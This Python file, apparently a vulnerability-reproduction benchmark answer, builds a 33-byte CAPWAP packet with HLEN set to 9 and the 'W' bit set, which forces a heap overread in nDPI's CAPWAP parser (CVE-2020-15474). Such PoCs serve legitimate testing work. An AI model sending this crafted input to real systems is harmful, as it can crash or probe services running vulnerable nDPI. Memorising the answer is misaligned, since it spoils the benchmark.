import sys

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generates a PoC for a heap buffer overread in ndpi_search_setup_capwap.

        The vulnerability (CVE-2020-15474) occurs when parsing a CAPWAP packet.
        If the 'W' (Wireless Info Present) bit is set in the header, the code
        attempts to read a wireless information header at an offset specified by
        the HLEN (Header Length) field. The vulnerability is that the code does
        not validate if this offset is within the packet's bounds.

        The offset is calculated as `header_len = HLEN * 4`.
        HLEN is a 4-bit value from the upper nibble of the second byte of the
        CAPWAP header. The 'W' bit is bit 3 of the fourth byte.

        To trigger the vulnerability with a PoC of the ground-truth length (33 bytes):
        1. Set the total packet length to 33 bytes.
        2. Set the 'W' bit in the header (byte 3).
        3. Set HLEN such that `HLEN * 4` is >= 33. The smallest integer HLEN
           that satisfies this is 9 (`9 * 4 = 36`).
        
        The PoC is constructed as follows:
        - A 4-byte header:
          - Byte 0: Version/Type (0x00)
          - Byte 1: HLEN=9 (0b1001) -> 0x90
          - Byte 2: Fragment Info (0x00)
          - Byte 3: 'W' bit set -> 0x08
        - 29 bytes of padding to make the total length 33.
        
        This causes the vulnerable code to attempt a read at offset 36 on a
        33-byte buffer, triggering an out-of-bounds read.
        """
        
        # PoC total length, matching ground truth.
        poc_len = 33

        # HLEN value needed to cause an overread for a 33-byte packet.
        # HLEN * 4 >= 33 => HLEN >= 8.25. Smallest integer is 9.
        hlen = 9

        # Construct the 4-byte CAPWAP header.
        # Byte 0: Version=0, Type=0
        b0 = 0x00
        # Byte 1: HLEN=9 (upper 4 bits), RID=0 (lower 4 bits)
        b1 = (hlen & 0x0F) << 4
        # Byte 2: Fragment ID, etc.
        b2 = 0x00
        # Byte 3: 'W' bit is bit 3.
        b3 = 0x08

        header = bytes([b0, b1, b2, b3])

        # Add padding to reach the desired total length.
        padding = b'\x00' * (poc_len - len(header))

        poc = header + padding
        
        return poc